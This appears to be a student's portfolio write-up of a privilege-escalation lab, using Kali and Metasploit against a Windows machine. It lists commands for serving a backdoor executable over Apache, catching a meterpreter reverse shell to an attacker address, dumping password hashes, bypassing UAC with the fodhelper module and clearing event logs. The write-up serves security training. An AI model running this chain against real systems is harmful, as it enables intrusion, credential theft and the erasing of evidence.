---
title: "Escalating Privileges"
collection: portfolio
permalink: /portfolio/escalating-privileges/
excerpt: "Lab – Escalating Privileges"
tags:
  - project
  - cybersecurity
---

**Lab –** **Escalating Privileges**

Attack Platform: Kali **1****0.9.51.40**

![Screenshot](/images/projects/escalating-privileges/image_1.png)

**Creating the backdoor in Kali.**

![Screenshot](/images/projects/escalating-privileges/image_2.png)

![Screenshot](/images/projects/escalating-privileges/image_3.png)

**Apache configuration**

![Screenshot](/images/projects/escalating-privileges/image_4.png)

┌──(kirui㉿kali)-[~/Desktop]

└─$ sudo mkdir /var/www/html/share/

┌──(kirui㉿kali)-[~/Desktop]

└─$ sudo chmod -R 755 /var/www/html/share/

┌──(kirui㉿kali)-[~/Desktop]

└─$ sudo chown -R www-data:www-data /var/www/html/share/

┌──(kirui㉿kali)-[~/Desktop]

└─$ ls -la /var/www/html/ | grep share

drwxr-xr-x  2 www-data www-data  4096 Jul 17 18:44 share

┌──(kirui㉿kali)-[~/Desktop]

└─$ sudo cp Exploit.exe /var/www/html/share/

┌──(kirui㉿kali)-[~/Desktop]

└─$ sudo service apache2 start

![Screenshot](/images/projects/escalating-privileges/image_5.png)

**Performing Exploitation**

Starting the Metasploit framework

*msfconsole*

*use exploit/multi/handler*

*set payload windows/meterpreter/reverse_tcp*

*set LHOST 10.9.51.40*

*exploit -j -z*

![Screenshot](/images/projects/escalating-privileges/image_6.png)

![Screenshot](/images/projects/escalating-privileges/image_7.png)

**Run the Exploit**

*http://10.9.51.40/share/*

![Screenshot](/images/projects/escalating-privileges/image_8.png)

Opening the executable.

![Screenshot](/images/projects/escalating-privileges/image_9.png)

Meterpreter session successfully opened:

![Screenshot](/images/projects/escalating-privileges/image_10.png)

![Screenshot](/images/projects/escalating-privileges/image_11.png)

**Establish a** **S****ession**

![Screenshot](/images/projects/escalating-privileges/image_12.png)

*run post/windows/gather/smart_hashdump*

![Screenshot](/images/projects/escalating-privileges/image_13.png)

On trying to escalate privileges using *getsystem -t 1*

![Screenshot](/images/projects/escalating-privileges/image_14.png)

**Perform Privilege Escalation**

Using the **bypassusac_fodhelper:** *use exploit/windows/local/bypassuac_fodhelper*

![Screenshot](/images/projects/escalating-privileges/image_15.png)

![Screenshot](/images/projects/escalating-privileges/image_16.png)

Setting the session to the previous meterpreter session and run the exploit.

![Screenshot](/images/projects/escalating-privileges/image_17.png)

*run post/windows/gather/smart_hashdump*

![Screenshot](/images/projects/escalating-privileges/image_18.png)

Clearing the event logs remotely using *clearev.*

![Screenshot](/images/projects/escalating-privileges/image_19.png)
